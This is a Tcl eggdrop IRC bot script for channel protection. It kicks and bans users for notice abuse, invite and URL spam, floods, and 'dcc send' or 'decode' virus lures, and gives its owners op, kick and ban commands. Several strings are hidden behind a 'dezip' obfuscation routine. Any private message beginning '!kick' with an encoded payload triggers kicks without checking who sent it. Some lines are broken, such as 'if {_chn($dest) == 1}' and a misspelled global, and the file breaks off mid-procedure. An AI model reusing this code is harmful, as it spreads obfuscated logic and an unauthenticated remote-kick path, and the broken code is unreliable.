proc ping_reply {nick uhost hand dest key arg} {
global pingchan botnick wait_ping notc owner ps
if {$nick != $owner && $nick != $ps} { return 0 }
catch { unset wait_ping }
if {$nick == $botnick} { 
return 0
}
set pingtime [expr [unixtime] - $arg]
if {[info exists pingchan($nick)]} { 
puthlp "PRIVMSG $pingchan($nick) : $nick PING Reply: $pingtime sec"
unset pingchan($nick)
}
if {![matchattr $nick f]} {
set hostmask "${nick}!*@*"
putlog "!Log! 1 minutes auto ignore to $hostmask"
newignore $hostmask $botnick "*" 1
}
return 0
}
proc pub_reset {nick uhost hand chan rest} {
global notc
putsrv "NOTICE $nick : !ReSeT!"
auto_ping "0" "0" "0" "0" "0"
ident_it
}
proc pub_pong {nick uhost hand chan rest} {
global pingchan
putsrv "PRIVMSG $nick :\001PING [unixtime]\001"
set pingchan($nick) $chan
return 0
}
proc pub_auth {nick uhost hand chan rest} {
global botnick notc
set cmd [string tolower [lindex $rest 0]]
set ch [passwdok $nick ""]
if {$ch == 1} {
puthlp "NOTICE $nick : No password set. Usage: pass <password>"
return 0
}
if {[matchattr $nick Q]} { 
puthlp "PRIVMSG $chan :${nick}, 03C15epek 03D15ulu 03B15os!"
}
if {![matchattr $nick Q]} { 
puthlp "PRIVMSG $chan :${nick}, 04Y15ou're 04N15ot 04L15ogin..!!"
}
}
proc notc_prot {nick uhost hand text {dest ""}} {
global notc botnick notc_chn bannick notm quick ismaskhost is_m
if {$dest != "" && $dest != $botnick} {
if {[string index $dest 0] == "+" || [string index $dest 0] == "@"} {
foreach x [channels] {
set x [string tolower $x]
if {[string match "*$x*" [string tolower $dest]]} {
set dest $x
break
}
}
} 
if {[isop $botnick $dest]} {
if {[string match "*-greet*" [channel info $dest]]} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {$nick == $botnick} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[isop $nick $dest]} { return 0 }
if {[isutimer "set_-m $dest"]} { return 0 }
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($nick) $banmask
if {[info exists notc_chn($dest)]} {
incr notc_chn($dest)
} {
set notc_chn($dest) 1
}
if {_chn($dest) == 1} {
putsrv "KICK $dest $nick : 1ABusINg 4NoTIcE1 @ps OnLY [banmsg]"
} elseif {$notc_chn($dest) == 2} {
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "KICK $dest $nick :$notm 1TwIcE 4NoTIcE1 ABusEd [banmsg]"
} {
putsrv "KICK $dest $nick :$notm 1TwIcE 4NoTIcE1 ABusEd [banmsg]"
}
} elseif {$notc_chn($dest) >= 3} {
if {[info exists ismaskhost]} {
set bannick($nick) [maskhost $banmask]
}
if {$quick == "1" && ![info exists is_m($dest)]} {
putqck "KICK $dest $nick :$notm 1tO mUcH 4vIoLencE1 FRoM THIS I.S.P 4@uT.1 !!"
} {
putsrv "KICK $dest $nick :$notm 1tO mUcH 4vIoLencE1 FRoM THIS I.S.P 4@uT.1 !!"
}
}
return 0
}
repeat_pubm $nick $uhost $hand $dest $text
} {
msg_prot $nick $uhost $hand $text
}
}
proc setignore {mask reason time} {
global quick
foreach x [ignorelist] {
if {[lindex $x 0] == $mask} { return 0 }
}
newignore $mask "IgN" $reason 15
if {$quick == "1"} {
putquick "silence +$mask"
} {
putserv "silence +$mask"
}
utimer $time [list unsetignore $mask]
}
proc unsetignore {mask} {
if {![isignore $mask]} { return 0 }
putserv "silence -$mask"
killignore $mask
}
set massmsg 0
proc msg_prot {unick uhost hand text} {
global nick botnick invme own nickpass altpass notc notb notd virus_nick ex_flood vern
global altnick twice_msg version bannick massmsg keep-nick badwords quick is_m ismaskhost
global querym
set querymsg [lindex $querym [rand [llength $querym]]]
regsub -all -- [dezip "jG~BDx04ntxb0"] $text "" text
msg_Z $unick $uhost $hand $text
set real $text
set text [uncolor $text]
if {$unick == $botnick} { return 0 }
if {[string match "*dcc send*" [string tolower $text]] && ![string match "*Serv*" $unick] && ![matchattr $unick f]} {
set virus_nick $unick
foreach x [channels] {
if {[onchan $virus_nick $x] && ![matchattr $virus_nick f] && ![isop $virus_nick $x]} {
if {[isop $botnick $x]} {
set host [getchanhost $virus_nick $x]
set host "*!*@[lindex [split $host @] 1]"
set bannick($virus_nick) $host
putsrv "KICK $x $virus_nick : 4!SpaM!1 I HaTE 4VIRuZ [banms]"
set virus_nick ""
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set sendspam "!kick [enzip "$x $unick  4!SpaM!1 FRoM 4@[lindex [split [getchanhost $virus_nick $x] @] 1]1 ViRuZ [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
return 0
}
if {$unick == "ChanServ"} {
if {[string match "*You do not have access to op people on*" $text] && [getuser "config" XTRA "MUSTOP"] != "" && $botnick == $nick} {
set partchn [lindex $text 9]
set partchn [string range $partchn 0 [expr [string length $partchn]-2]]
if {[string match "*-secret*" [channel info $partchn]]} {
putsrv "PART $partchn :((((@pGuaRd))))"
channel remove $partchn
savechan
}
}
if {[string match "*is not on*" $text]} { 
set text [string tolower $text]
foreach x [channels] {
set x [string tolower $x]
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string match "*$x*" $text]} {
if {![string match "*c*" [getchanmode $x]]} {
putsrv "PART $x :1regained (4@1)ps status"
} {
putsrv "PART $x :1regained (@)ps status"
}
if {[matchattr $cflag K]} {
puthlp "JOIN $x :[dezip [getuser $cflag XTRA "CI"]]"
} {
puthlp "JOIN $x"
}
}
}
return 0
}
if {[string match "*AOP:*SOP:*AKICK*" $text]} {
foreach errchan [channels] {
set cflag "c$errchan"
set cflag [string range $cflag 0 8]
if {[string match "*[string tolower $errchan] *" [string tolower $text]]} {
if {![isop $botnick $errchan]} {
timer 1 { putlog "resync" }
if {![string match "*c*" [getchanmode $errchan]]} {
putsrv "PART $errchan :1regained (4@1)ps status"
} {
putsrv "PART $errchan :regained (@)ps status"
}
if {[matchattr $cflag K]} {
puthlp "JOIN $errchan :[dezip [getuser $cflag XTRA "CI"]]"
} {
puthlp "JOIN $errchan"
}
}
return 0
}
}
}
return 0 
}
if {$unick == "NickServ"} {
if {[string match "*nick is owned*" [string tolower $text]]} { 
putlog "!Log! IDeNTIFY"
catch { clearqueue all }
if {$botnick == $nick && $nickpass != ""} { 
putsrv "NickServ identify $nickpass"
}
if {$botnick == $altnick && $altpass != ""} { 
putsrv "NickServ identify $altpass"
}
}
if {[string match "*Password accepted for*" $text]} { auto_reop }
if {[string match "*The nick $nick is not registered*" $text] && $nickpass != ""} {
if {[getuser "config" XTRA "EMAIL"] != ""} {
putsrv "NickServ register $nickpass [getuser "config" XTRA "EMAIL"]"
}
}
if {[string match "*The nick $nick has been temporarily registered to you*" $text]} {
putsrv "NickServ identify $nickpass"
}
return 0
}
if {$unick == "MemoServ"} {
if {[string match "*New DALnet news is available*" $text]} {
putsrv "PRIVMSG MemoServ@services.dal.net :NEWS"
}
return 0
}
if {[string match "!kick*" [string tolower $text]]} {
set salls [dezip [lrange $text 1 end]]
set schan [lindex $salls 0]
set snick [lindex $salls 1]
set sreas [lrange $salls 2 end]
if {![isop $botnick $schan] || [matchattr $snick f] || ![onchan $snick $schan]} { return 0 }
set banhost [getchanhost $snick $schan]
set banhost "*!*@[lindex [split $banhost @] 1]"
set bannick($snick) $banhost
regsub -all -- [dezip "bF~uC0.JqaEc0"] $sreas "" sreas
regsub -all -- [dezip "xdxs~F1hBM6q0"] $sreas "" sreas
putsrv "KICK $schan $snick :$sreas"
return 0
}
if {[string match "*auth*" $text] || [string match "*[string tolower $notb]*" [string tolower $text]]} { return 0 }
if {[matchattr $hand f]} { return 0 }
set mhost [string range $uhost [string first "@" $uhost] end]
if {![isutimer "MSGCOUNTER"]} {
utimer 20 { putlog "MSGCOUNTER" }
set massmsg 1
} {
set massmsg [incr massmsg]
if {[string length $text] > 100} {
set massmsg [incr massmsg]
}
if {$massmsg >= 5} {
set massmsg 0
set mhost [string range $uhost [string first "@" $uhost] end]
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "MaZz MSg" 300
} {
setignore "*!*$mhost" "MaZz MSg" 300
}
foreach iamop [channels] {
if {[isop $botnick $iamop]} {
if {[string match "*c*" [getchanmode $iamop]]} {
puthlp "PRIVMSG $iamop :\001ACTION IncOmINg MaZz MSg..! LasT FRoM [unsix "$unick!$uhost"]\001"
} {
puthlp "PRIVMSG $iamop :\001ACTION IncOmINg MaZz MSg..! LasT FRoM 1[unsix "$unick!$uhost"]\001"
}
foreach c [chanlist $iamop] {
set nickhost [string range [getchanhost $c $iamop] [string first "@" [getchanhost $c $iamop]] end]
if {$nickhost == $mhost && ![matchattr $c f]} {
if {$c == $botnick} { return 0 }
set bannick($c) "*!*$mhost"
putsrv "KICK $iamop $c : 1Heavy 4FLoOd1 MSg FRoM 4$mhost [banms]"
break
}
}
}
}
return 0
}
}
if {[string match "*decode*" [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set bannick($unick) "*!*$mhost"
putsrv "KICK $x $unick : 4!SpaM!1 I HaTE 4dEcOdE [banms]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set sendspam "!kick [enzip "$x $unick  4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 dEcOdE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
}
}
set invme($mhost) "dEcOdE"
}
if {[string match "*#*" $text] || [string match "*/j*" $text]} {
foreach x [channels] {
set chksiton [string tolower $x]
if {[string match "*$chksiton*" [string tolower $text]]} { return 0 }
}
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "KICK $x $unick : 4!SpaM!1 I HaTE 4InvITeR [banms]"
return 0
} {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set sendspam "!kick [enzip "$x $unick  4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 InvITE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
} {
set banmask "[string range $uhost [string first "@" $uhost] end]"
if {$banmask != "*!*@*" && $banmask != "*"} {
foreach c [chanlist $x] {
set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
if {$banmask == $nickhost} {
if {[matchattr $c f]} {
return 0
}
if {$c != $botnick} {
if {[isop $botnick $x]} {
set bannick($c) $banmask
set mhost [string range $uhost [string first "@" $uhost] end]
putsrv "KICK $x $c : 4!SpaM!1 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
} {
set members [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
set sendspam "!kick [enzip "$x $c  4!SpaM!1 InvITeR 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
break
}
}
}
return 0
}
}
}
}
}
}
set invme($mhost) "InvITE"
return 0
}
if {[string match "*http:/*" [string tolower $text]] || [string match "*www.*" [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $botnick $x]} {
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
set bannick($unick) $banmask
putsrv "KICK $x $unick : 4!SpaM!1 I HaTE 4AdvERTIsE [banms]"
return 0
} else {
set members [chanlist $x f]
foreach c $members {
if {[isop $c $x]} {
set sendspam "!kick [enzip "$x $unick  4!SpaM!1 FRoM 4[string range $uhost [string first "@" $uhost] end]1 AdvERTIsE [banmsg]"]"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
}
} {
set banmask "[string range $uhost [string first "@" $uhost] end]"
if {$banmask != "*!*@*" && $banmask != "*"} {
foreach c [chanlist $x] {
set nickhost "[string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]"
if {$banmask == $nickhost} {
if {[matchattr $c f]} {
return 0
}
if {$c != $botnick} {
if {[isop $botnick $x]} {
set bannick($c) $banmask
set mhost [string range $uhost [string first "@" $uhost] end]
putsrv "KICK $x $c : 4!SpaM!1 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"
} {
set members [chanlist $x f]
foreach s $members {
if {[isop $s $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
set sendspam "!kick [enzip "$x $c  4!SpaM!1 AdvERTIsE 4ReLaY1 FRoM 4$unick1 IP 4$mhost [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
return 0
}
}
}
return 0
}
}
}
}
}
}
set invme($mhost) "AdvERTIsE"
return 0
}
set mhost [string range $uhost [string first "@" $uhost] end]
if {[string length $text] > 100} {
set chr 0
set cnt 0
while {$cnt < [string length $real]} {
if [isflood [string index $real $cnt]] {
incr chr
}
incr cnt
}
if {$chr > 30} {
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "TsunamI MSg" 300
} {
setignore "*!*$mhost" "TsunamI MSg" 300
}
foreach x [channels] {
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg TsunamI MSg..! FRoM [unsix "$unick!$uhost"]\001"
} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg TsunamI MSg..! FRoM 1[unsix "$unick!$uhost"]\001"
}
foreach c [chanlist $x] {
set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} {
return 0
}
set bannick($c) "*!*$mhost"
putsrv "KICK $x $c : 4TsunamI1 MSg FRoM 4$mhost [banms]"
break
}
}
}
}
return 0
}
}
foreach badword [string tolower $badwords] {
if {[string match *$badword* [string tolower $text]]} {
foreach x [channels] {
if {[onchan $unick $x]} {
if {[isop $unick $x] || [isvoice $unick $x]} { return 0 }
if {[isop $botnick $x]} {
set bannick($unick) "*!*$mhost"
putsrv "KICK $x $unick : 4BaDWoRD1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $badword] [banms]"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set sendspam "!kick [enzip "$x $unick  4BaDWoRD1 MSg FRoM 4$mhost1 MaTcH FRoM 4[string toupper $badword] [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
}
}
}
}
}
}
}
if {[string length $text] > 200} {
if {![isutimer "LONGTEXT"]} {
utimer 30 { putlog "LONGTEXT" }
setignore "*!*@*" "*" 120
if {[info exists ismaskhost]} {
setignore [maskhost "*!*$mhost"] "LoNg TexT MSg" 300
} {
setignore "*!*$mhost" "LoNg TexT MSg" 300
}
}
foreach x [channels] {
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg LoNg TexT MSg..! FRoM [unsix "$unick!$uhost"]\001"
} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg LoNg TexT MSg..! FRoM 1[unsix "$unick!$uhost"]\001"
}
foreach c [chanlist $x] {
set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} { return 0 }
set bannick($c) "*!*$mhost"
putsrv "KICK $x $c : 1LoNg TexT MSg FRoM 4$mhost [banms]"
break
}
}
} {
foreach c [chanlist $x] {
set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
if {[matchattr $c f] || $c == $botnick} {
return 0
}
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set sendspam "!kick [enzip "$x $c  1LoNg TexT MSg FRoM 4$mhost [banms]"]"
putsrv "PRIVMSG $s :$sendspam"
break
}
}
}
}
}
}
return 1
}
if {$unick != $own} {
if {[info exists twice_msg($unick)]} {
set hostmask "${unick}!*@*"
puthlp "PRIVMSG $unick :$querymsg"
putlog "!Log! IgNORE <<$hostmask>> PV-msg"
unset twice_msg($unick)
newignore $hostmask $unick "*" 2
} {
if {[istimer "chkautomsg"]} {
set invme($mhost) "AuToJoIN MSg"
return 0
}
if {[isutimer "NO REPLY"]} { 
foreach x [utimers] {
if {[string match "*NO REPLY*" $x]} { 
killutimer [lindex $x 2] 
}
}
utimer 10 { putlog "NO REPLY" }
return 0
}
utimer 10 { putlog "NO REPLY" }
if {[string match "*dal*et*" $uhost]} {
puthlp "PRIVMSG $unick :$querymsg"
} {
if {[getuser "config" XTRA "AWAY"]!=""} { 
puthlp "PRIVMSG $unick :$querymsg"
} {
puthlp "PRIVMSG $unick :$querymsg"
}
set twice_msg($unick) 1
}
}
}
}
proc auto_reop {} {
global notc botnick
foreach x [channels] {
if {[onchan $botnick $x]} { 
if {![isop $botnick $x] && [string tolower $x] != [dezip "ER5sr09TRjx1"]} {
if {![string match "*+protectfriends*" [channel info $x]]} {
set cret 30
foreach ct [utimers] {
if {[string match "*chancnt*" $ct]} {
if {[expr [lindex $ct 0] + 30] > $cret} {
set cret [expr [lindex $ct 0] + 30]
}
}
}
utimer $cret [list chancnt $x]
}
}
}
}
return 0
}
proc chancnt {chan} {
if {[isutimer "chancnt $chan"]} { return 0 }
putsrv "ChanServ count $chan"
}
proc msg_kick {nick uhost hand rest} {
global notc botnick own
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
set reason [lrange $rest 2 end]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick : Usage: kick <#chan> <Nick> <Reason>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick : NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $nicktarget is not on the channel."
return 0
}
if {$nicktarget == $botnick} {
puthlp "NOTICE $nick : I cant self kick."
return 0
}
if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick : I CaNT KIcK MY Admin."
return 0
}
if {$reason == ""} {
set reason "1ReQuesT..!"
if {[matchattr $nick n]} { 
set reason "1Admin 4KIcK1 ReQuesT4..!"
}
if {[matchattr $nick m] && ![matchattr $nick n]} { 
set reason "1MasTeR 4KIcK1 ReQuesT4..!"
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putsrv "KICK $x $nicktarget : $reason"
return 0
}
}
puthlp "NOTICE $nick : NoT IN $chantarget"
}
proc msg_kickban {nick uhost hand rest} {
global notc botnick own bannick
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
set bmask [getchanhost $nicktarget $chantarget]
set bmask "*!*@[lindex [split $bmask @] 1]"
set reason [lrange $rest 2 end]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick : Usage: kickban <#chan> <Nick> <Reason>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick : NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $nicktarget is not on the channel."
return 0
}
if {$nicktarget == $botnick} {
puthlp "NOTICE $nick : I cant self kick."
return 0
}
if {[matchattr $nicktarget n] && ![matchattr $nick Z]} {
puthlp "NOTICE $nick : I cant kickban my Admin."
return 0
}
if {$reason == ""} {
set reason "1KIcKBaN ReQuesT4..!"
if {[matchattr $nick m]} {
set reason "1MasTeR 4KIcKBaN1 ReQuesT [banmsg]"
}
if {[matchattr $nick n]} {
set reason "1Admin 4KIcKBaN1 ReQuesT [banmsg]"
}
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
set bannick($nicktarget) $bmask
putsrv "KICK $x $nicktarget : $reason"
return 0
}
}
puthlp "NOTICE $nick : NoT IN $chantarget"
}
proc msg_op {nick uhost hand rest} {
global notc botnick
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick : Usage: op <#chan> <Nick>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick : NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $nicktarget is not on the channel."
return 0
}
if {[isop $nicktarget $chantarget]!=0} {
puthlp "NOTICE $nick : $nicktarget is already op on CHaNNEL $chantarget"
return 0
}
foreach x [channels] {
if {[string tolower $x] == [string tolower $chantarget]} {
opq $x $nicktarget
return 0
}
}
puthlp "NOTICE $nick : NoT IN $chantarget"
}
proc msg_voice {nick uhost hand rest} {
global notc botnick
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick : Usage: voice <#chan> <Nick>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick : NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $nicktarget is not on the channel."
return 0
}
if {[isvoice $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $nicktarget is already voice on channel $chantarget"
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putserv "mode $x +v $nicktarget"
return 0
}
}
puthlp "NOTICE $nick : NoT IN $chantarget"
}
proc msg_deop {nick uhost hand rest} {
global notc botnick own
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick : Usage: deop <#chan> <Nick>"
return 0
}
if {[isop $botnick $chantarget] != 1} {
puthlp "NOTICE $nick : NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $nicktarget is not on the channel."
return 0
}
if {![isop $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $chantarget is not op on CHaNNEL $chantarget"
return 0
}
if {$nicktarget == $botnick} {
puthlp "NOTICE $nick : I CaNT SeLF DEoP!"
return 0
}
if {[matchattr $nicktarget n]} {
puthlp "NOTICE $nick : I cant deop my Owner."
return 0
}
if {[matchattr $nick m]} {
set mreq "4MasTeR.ReQuesT"
}
if {[matchattr $nick n]} {
set mreq "4Admin.ReQuesT"
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
if {![string match "*k*" [getchanmode $x]]} {
putserv "mode $x -ko $mreq $nicktarget"
} {
putserv "mode $x -o $nicktarget"
}
return 0
}
}
puthlp "NOTICE $nick : NoT IN $chantarget"
}
proc msg_devoice {nick uhost hand rest} {
global notc botnick owner
set chantarget [lindex $rest 0]
set nicktarget [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick : 4deNiEd!"
return 0
}
if {($chantarget == "") || ($nicktarget == "")} {
puthlp "NOTICE $nick : Usage: devoice <#chan> <Nick>"
return 0
}
if {[isop $botnick $chantarget]!=1} {
puthlp "NOTICE $nick : NoT OP CHaNNEL $chantarget"
return 0
}
if {![onchan $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $nicktarget is not on the channel."
}
if {![isvoice $nicktarget $chantarget]} {
puthlp "NOTICE $nick : $nicktarget is not voice on CHaNNEL $chantarget"
}
if {$nicktarget == $owner} {
puthlp "NOTICE $nick : I cant devoice my owner."
return 0
}
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
putserv "mode $x -v $nicktarget"
return 0
}
}
puthlp "NOTICE $nick : NoT IN $chantarget"
}
bind kick - * prot:kick
proc prot:kick {nick uhost handle chan knick reason} {
global notc notd botnick ps kickme notb notm bannick igflood botname quick is_m op_it is_ban iskick
set cflag "c$chan"
set cflag [string range $cflag 0 8]
if {[string match "* *" $reason] || [string match "*$notm*" $reason]} {
set igflood($nick) "1"
}
if {[info exists iskick($knick$chan)]} {
unset iskick($knick$chan)
}
if {$nick == $botnick} {
if {[info exists kickme($knick)]} { 
if {$kickme($knick) == 1} {
set kickme($knick) 2
}
if {$kickme($knick) == 3} {
catch { unset kickme($knick) }
}
}
if {[string match "*$notm*" $reason]} {
if {![info exists bannick($knick)]} { return 0 }
if {[info exists is_ban($bannick($knick)$chan)]} { return 0 }
set is_ban($bannick($knick)$chan) 1
if {$bannick($knick) == "*!*@*"} { return 0 }
set cmode [getchanmode $chan]
set ok_m "1"
if {[info exists is_m($chan)]} {
set ok_m "0"
}
if {[isutimer "set_-m $chan"]} {
set ok_m "0"
}
if {[string match "*m*" $cmode]} {
set ok_m "0"
}
if {$ok_m == "1"} {
set is_m($chan) 1
if {$quick == "1"} {
putquick "mode $chan +bm $bannick($knick)"
} {
putserv "mode $chan +bm $bannick($knick)"
}
} {
if {$quick == "1"} {
putquick "mode $chan +b $bannick($knick)"
} {
putserv "mode $chan +b $bannick($knick)"
}
}
return 0
} {
if {![info exists bannick($knick)]} { return 0 }
if {$bannick($knick) == "*!*@*"} { return 0 }
putserv "mode $chan +b $bannick($knick)"
if {[string match "*4BaNNEd1: 3 MINUTES*" $reason]} { utimer 180 [list unbanq $chan $bannick($knick)] }
}
return 0
}
if {$nick == $knick} { return 0 }
if {$nick == "ChanServ"} { return 0 }
if {[matchattr $nick f]} { return 0 }
if {[string match "* *" $reason] || [string match "*$notm*" $reason]} { return 0 }
if {$knick == $botnick} {
if {[info exists kickme($nick)]} { 
set kickme($nick) 3
if {[string tolower $chan] != [dezip "ER5sr09TRjx1"]} {
putsrv "ChanServ deop $chan $nick"
}
} {
if {[matchattr $cflag D]} {
set kickme($nick) 1
}
}
puthlp "JOIN $chan"
return 0
}
if {![isop $botnick $chan]} { return 0 }
if {$knick == $notb} {
putserv "KICK $chan $nick : 1DonT KIcK 4$notb1..!"
set op_it($knick) 1
return 0
}
if {$knick == $ps} {
putserv "KICK $chan $nick : 1DonT KIcK 4$ps1..!"
set op_it($knick) 1
return 0
}
if {[matchattr $knick n]} {
putsrv "KICK $chan $nick : 1Admin 4KIcK1 PRoTecTIoN4..!"
set op_it($knick) 1
return 0
}
if {[matchattr $knick m]} {
putsrv "KICK $chan $nick : 1MasTeR 4KIcK1 PRoTecTIoN4..!"
set op_it($knick) 1
return 0
}
}
proc unbanq {chan host} {
global botnick
if {[isop $botnick $chan]} {
puthelp "mode $chan -b $host"
}
}
set banidx 1
proc banmsg {} {
global banidx bancounter
set banidx [incr banidx]
if {$banidx >= [llength $bancounter]} { 
set banidx 1
}
set banmsg [lindex $bancounter $banidx]
}
proc banms {} {
global banidx bancounte
set banidx [incr banidx]
if {$banidx >= [llength $bancounte]} { 
set banidx 1
}
set banms [lindex $bancounte $banidx]
}
proc ban_chk {nick uhost handle channel mchange bhost} {
global botnick botname ps quick notb notc bannick ban-time igflood invme ex_flood
set mhost [string range $bhost [string first "@" $bhost] end]
set cflag "c$channel"
set cflag [string range $cflag 0 8]
if {[info exists invme($mhost)]} {
catch { unset invme($mhost) }
}
if {[info exists ex_flood($mhost)]} {
catch { unset ex_flood($mhost) }
}
if {![isop $botnick $channel]} { return 0 }
set banmask "*!*[string range $uhost [string first "@" $uhost] end]"
if {$banmask == "*!*@*"} {
set banmask "$nick!*@*"
}
if {$bhost == "*!*@*"} {
utimer [rand 4] [list unbanq $channel $bhost]
return 1
}
set cmode [getchanmode $channel]
if {[getuser "config" XTRA "IPG"] != ""} {
foreach ipg [getuser "config" XTRA "IPG"] {
if {[string match $ipg $bhost] || [string match $bhost $ipg]} {
if {![isutimer "IPG $bhost"]} {
if {![string match "*k*" $cmode]} {
puthelp "mode $channel -kb 4IpgUaRd $bhost"
} {
puthelp "mode $channel -b $bhost"
}
utimer 60 [list putlog "IPG $bhost"]
}
return 1
}
}
}
if {[string match [string tolower $bhost] [string tolower $botname]]} {
if {![matchattr $nick f] && $nick != $botnick && $nick != "ChanServ" && ![string match "*dal.net*" $nick] && ![info exists igflood($nick)]} {
if {[matchattr $cflag D]} {
if {$quick == "1"} {
putqck "KICK $channel $nick : 1SeLF 4BaNNINg1 DeFeNsE REvERsINg [banmsg]"
} {
putsrv "KICK $channel $nick : 1SeLF 4BaNNINg1 DeFeNsE REvERsINg [banmsg]"
}
}
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
} {
putserv "mode $channel -kb+b 4SeLF.UnBaN $bhost $banmask"
}
} {
if {$quick == "1"} {
putquick "mode $channel -b+b $bhost $banmask"
} {
putserv "mode $channel -b+b $bhost $banmask"
}
}
} { 
if {![string match "*k*" $cmode]} {
if {$quick == "1"} {
putquick "mode $channel -kb 4SeLF.UnBaN $bhost"
} else {
putserv "mode $channel -kb SeLF.UnBaN $bhost"
}
} {
if {$quick == "1"} {
putquick "mode $channel -b $bhost"
} else {
putserv "mode $channel -b $bhost"
}
}
}
return 1
}
foreach knick [chanlist $channel] {
if {[string match [string tolower $bhost] [string tolower $knick![getchanhost $knick $channel]]]} {
if {[matchattr $knick f]} {
if {$knick != $ps && $knick != $notb} { utimer [rand 4] [list unbanq $channel $bhost] }
if {[matchattr $nick f] || $nick == $botnick || $nick == "ChanServ" || [string match "*dal.net*" $nick] || [info exists igflood($nick)]} { return 1 }
}
if {$knick == $notb} {
if {$nick != $botnick} {
